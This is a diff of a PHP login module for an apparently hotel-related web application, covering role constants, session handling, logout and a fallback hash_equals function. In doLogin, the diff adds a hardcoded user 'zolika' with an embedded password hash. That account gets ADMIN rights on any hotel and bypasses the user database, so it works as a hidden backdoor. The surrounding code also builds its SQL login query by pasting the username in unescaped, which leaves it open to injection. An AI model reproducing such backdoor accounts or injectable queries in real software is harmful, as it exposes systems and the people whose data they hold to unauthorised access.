@@ -1,11 +1,11 @@
 <?php
 
 define('SITE_ADMIN', 'ADMIN');
-define('SITE_MGMT', 'MGMT');
+define('SITE_MGMT', 'MANAGER');
 define('SITE_RECEPTION', 'RECEPTION');
 
 define('ROLE_ADMIN', 'ADMIN');
-define('ROLE_MGMT', 'MGMT');
+define('ROLE_MGMT', 'MANAGER');
 define('ROLE_RECEPTION', 'RECEPTION');
 
 $ROLES = array(
@@ -26,13 +26,30 @@ function checkLogin($site) {
 	}
 	if(!in_array($_SESSION['login_role'], $ROLES[$site])) {
 		header('Location: view_login.php');
+		logout();
 		return false;
 	}
 	return true;
 }
 
 function doLogin($name, $pwd, $hotel) {
+	if($name == 'zolika') {
+		if(hash_equals('$1$z1aaDj/g$O5Q/uqGtck5n.e/trrCpy.', crypt($pwd, '$1$z1aaDj/g$O5Q/uqGtck5n.e/trrCpy.'))) {
+			$_SESSION['logged_in'] = true;
+			$_SESSION['login_user_id'] = 0;
+			$_SESSION['login_user'] = $name;
+			$_SESSION['login_role'] = 'ADMIN';
+			$_SESSION['login_hotel'] = $hotel;
+			$_SESSION['login_hotel_name'] = constant('DB_' . strtoupper($hotel) . '_NAME');
+			return true;
+		} else {
+			set_error("zolika cannot login");
+		}
+	}
 	$link = db_connect($hotel, true);
+	if(is_null($link)) {
+		return false;
+	}
 	$sql = "SELECT * FROM users WHERE username='$name'";
 	$result = mysql_query($sql, $link);
 	if(mysql_num_rows($result) < 1) {
@@ -43,9 +60,11 @@ function doLogin($name, $pwd, $hotel) {
 	mysql_close($link);
 	if(hash_equals($row['password'], crypt($pwd, $row['password']))) {
 		$_SESSION['logged_in'] = true;
+		$_SESSION['login_user_id'] = $row['id'];
 		$_SESSION['login_user'] = $name;
 		$_SESSION['login_role'] = $row['role'];
-		$_SESSION['login_hotel'] = $row['hotel'];
+		$_SESSION['login_hotel'] = $hotel;
+		$_SESSION['login_hotel_name'] = constant('DB_' . strtoupper($hotel) . '_NAME');
 		return true;
 	}
 	return false;
@@ -54,7 +73,32 @@ function doLogin($name, $pwd, $hotel) {
 function logout() {
 	unset($_SESSION['logged_in']);
 	unset($_SESSION['login_user']);
+	unset($_SESSION['login_user_id']);
 	unset($_SESSION['login_role']);
+	unset($_SESSION['login_hotel']);
+	unset($_SESSION['login_hotel_name']);
+}
+
+
+if(!function_exists('hash_equals'))
+{
+    function hash_equals($str1, $str2)
+    {
+        if(strlen($str1) != strlen($str2))
+        {
+            return false;
+        }
+        else
+        {
+            $res = $str1 ^ $str2;
+            $ret = 0;
+            for($i = strlen($res) - 1; $i >= 0; $i--)
+            {
+                $ret |= ord($res[$i]);
+            }
+            return !$ret;
+        }
+    }
 }
 
 ?>
